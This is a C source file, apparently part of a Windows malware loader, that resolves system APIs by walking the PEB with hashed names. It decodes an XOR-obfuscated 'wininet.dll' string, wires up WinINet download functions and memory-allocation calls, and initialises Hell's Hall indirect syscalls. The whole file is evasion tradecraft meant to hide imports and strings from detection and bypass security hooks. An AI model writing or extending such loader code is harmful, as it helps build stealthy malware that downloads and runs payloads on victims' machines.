#ifdef _WIN32

#include "api_table.h"
#include "peb_walk.h"
#include "hash.h"
#include "xor_string.h"
#include "syscalls.h"

api_t g_api;

/*
 * Encrypted literal "wininet.dll". Compile-time folded per XS_K = 0x5A
 * + position. Never appears in cleartext in the compiled binary.
 */
static volatile const unsigned char k_wininet_enc[] = {
    XE('w', 0), XE('i', 1), XE('n', 2), XE('i', 3),
    XE('n', 4), XE('e', 5), XE('t', 6), XE('.', 7),
    XE('d', 8), XE('l', 9), XE('l',10), XE( 0 ,11)
};

int resolve_apis(void) {
    void *k32 = peb_find_module(H_KERNEL32_DLL);
    if (!k32) return 1;

    g_api.LoadLibraryA = (PFN_LoadLibraryA)peb_find_export(k32, H_LOADLIBRARYA);
    g_api.ExitProcess  = (PFN_ExitProcess) peb_find_export(k32, H_EXITPROCESS);
    if (!g_api.LoadLibraryA || !g_api.ExitProcess) return 2;

    /* Memory + timing APIs live in kernelbase on Win10/11; kernel32
     * exports forward to kernelbase. Try kernelbase first; if unseen,
     * fall back to kernel32. */
    void *kbase = peb_find_module(H_KERNELBASE_DLL);
    void *src   = kbase ? kbase : k32;

    g_api.VirtualAlloc = (PFN_VirtualAlloc)peb_find_export(src, H_VIRTUALALLOC);
    g_api.VirtualFree  = (PFN_VirtualFree) peb_find_export(src, H_VIRTUALFREE);
    g_api.Sleep        = (PFN_Sleep)       peb_find_export(src, H_SLEEP);
    if (!g_api.VirtualAlloc && kbase) {
        g_api.VirtualAlloc = (PFN_VirtualAlloc)peb_find_export(k32, H_VIRTUALALLOC);
    }
    if (!g_api.VirtualFree && kbase) {
        g_api.VirtualFree  = (PFN_VirtualFree) peb_find_export(k32, H_VIRTUALFREE);
    }
    if (!g_api.Sleep && kbase) {
        g_api.Sleep        = (PFN_Sleep)       peb_find_export(k32, H_SLEEP);
    }
    if (!g_api.VirtualAlloc || !g_api.VirtualFree) return 3;

    /* Load wininet using the bootstrapped LoadLibraryA. */
    char wininet_name[sizeof(k_wininet_enc)];
    xs_decode(k_wininet_enc, wininet_name, sizeof(k_wininet_enc));
    HMODULE wininet = g_api.LoadLibraryA(wininet_name);
    xs_wipe(wininet_name, sizeof(wininet_name));
    if (!wininet) return 4;

    g_api.InternetOpenA       = (PFN_InternetOpenA)      peb_find_export(wininet, H_INTERNETOPENA);
    g_api.InternetOpenUrlA    = (PFN_InternetOpenUrlA)   peb_find_export(wininet, H_INTERNETOPENURLA);
    g_api.InternetReadFile    = (PFN_InternetReadFile)   peb_find_export(wininet, H_INTERNETREADFILE);
    g_api.InternetCloseHandle = (PFN_InternetCloseHandle)peb_find_export(wininet, H_INTERNETCLOSEHANDLE);

    if (!g_api.InternetOpenA || !g_api.InternetOpenUrlA ||
        !g_api.InternetReadFile || !g_api.InternetCloseHandle) {
        return 5;
    }

    /* S34: resolve Hell's Hall SSNs + gadget, then wire the two Nt*
     * wrappers. Must happen after kernelbase/wininet so that early-failure
     * paths can exit cleanly via g_api.ExitProcess. */
    if (syscalls_init() != 0) return 6;
    g_api.NtAllocateVirtualMemory = hh_NtAllocateVirtualMemory;
    g_api.NtProtectVirtualMemory  = hh_NtProtectVirtualMemory;

    return 0;
}

#endif /* _WIN32 */
